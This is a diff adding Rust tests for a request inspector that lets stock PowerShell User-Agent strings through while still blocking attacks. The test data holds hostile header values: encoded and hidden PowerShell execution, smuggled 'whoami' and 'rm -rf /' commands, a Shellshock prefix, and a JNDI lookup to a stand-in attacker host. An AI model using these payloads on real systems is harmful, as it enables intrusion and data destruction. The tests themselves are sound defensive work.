@@ -304,3 +304,84 @@ async fn case_and_suffix_variants_cannot_skip_body_inspection() {
         );
     }
 }
+
+const STOCK_POWERSHELL_USER_AGENTS: [&str; 4] = [
+    "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.22621.2506",
+    "Mozilla/5.0 (Windows NT 10.0; Microsoft Windows 10.0.22631; en-US) PowerShell/7.4.1",
+    "Mozilla/5.0 (Linux; Ubuntu 22.04.3 LTS; en-US) PowerShell/7.4.1",
+    "Mozilla/5.0 (Macintosh; Darwin 23.1.0; en-US) PowerShell/7.5.0-preview.2",
+];
+
+fn user_agent_headers(name: &'static str, value: &str) -> HeaderMap {
+    let mut headers = HeaderMap::new();
+    headers.insert(name, HeaderValue::from_str(value).unwrap());
+    headers
+}
+
+#[test]
+fn stock_powershell_user_agents_are_not_command_injection() {
+    for agent in STOCK_POWERSHELL_USER_AGENTS {
+        assert!(
+            !RaspInspector::inspect_headers(&user_agent_headers("user-agent", agent)),
+            "{agent}"
+        );
+    }
+}
+
+#[test]
+fn powershell_execution_syntax_in_a_user_agent_still_blocks() {
+    for agent in [
+        "() { :; }; powershell -enc SQBFAFgA",
+        "x; powershell.exe -nop -w hidden -c iex",
+        "Mozilla/5.0 powershell -Command Invoke-WebRequest",
+        "Mozilla/5.0 |powershell/7 -c whoami",
+        "Mozilla/5.0 PowerShell/7.4.1;whoami",
+        "Mozilla/5.0 PowerShell/7.4.1&whoami",
+        "Mozilla/5.0 PowerShell%2F7.4.1",
+        "Mozilla/5.0 PowerShell/ 7",
+        "Mozilla/5.0 PowerShell/x7",
+        "Mozilla/5.0 WindowsPowerShell -c whoami",
+        "PowerShell/7.4.1 powershell -enc SQBFAFgA",
+        // Other signatures in the same value are unaffected by the exemption.
+        "Mozilla/5.0 PowerShell/7.4.1 ; rm -rf /",
+        "PowerShell/7.4.1 ${jndi:ldap://evil.example/a}",
+    ] {
+        assert!(
+            RaspInspector::inspect_headers(&user_agent_headers("user-agent", agent)),
+            "{agent}"
+        );
+    }
+    // The exemption is limited to User-Agent and leaves every other surface intact.
+    assert!(RaspInspector::inspect_headers(&user_agent_headers(
+        "x-client",
+        "PowerShell/7.4.1"
+    )));
+    assert!(RaspInspector::inspect_text(STOCK_POWERSHELL_USER_AGENTS[1]));
+    assert!(RaspInspector::inspect_uri("/run?shell=PowerShell/7.4.1"));
+}
+
+#[tokio::test]
+async fn middleware_serves_stock_powershell_clients() {
+    let app = guarded_app();
+    for agent in STOCK_POWERSHELL_USER_AGENTS {
+        let request = Request::builder()
+            .uri("/items")
+            .header(header::USER_AGENT, agent)
+            .body(Body::empty())
+            .unwrap();
+        assert_eq!(
+            app.clone().oneshot(request).await.unwrap().status(),
+            StatusCode::OK,
+            "{agent}"
+        );
+    }
+    let attack = Request::builder()
+        .uri("/items")
+        .header(header::USER_AGENT, "x; powershell -enc SQBFAFgA")
+        .body(Body::empty())
+        .unwrap();
+    assert_eq!(
+        app.oneshot(attack).await.unwrap().status(),
+        StatusCode::FORBIDDEN
+    );
+}
